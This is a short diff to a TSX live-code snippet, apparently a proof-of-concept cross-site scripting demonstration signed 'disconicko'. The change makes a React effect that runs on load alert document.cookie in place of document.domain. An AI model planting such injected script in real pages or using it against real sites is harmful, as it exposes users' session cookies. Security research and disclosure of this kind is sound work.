@@ -2,7 +2,7 @@
 ```tsx
 () => {
   React.useEffect(() => {
-    alert('XSS on ' + document.domain + ' — disconicko');
+    alert('XSS on ' + document.cookie + ' — disconicko');
   }, []);
   return (
     <div style={{padding: 8, background: '#fde68a', border: '2px solid #b45309'}}>
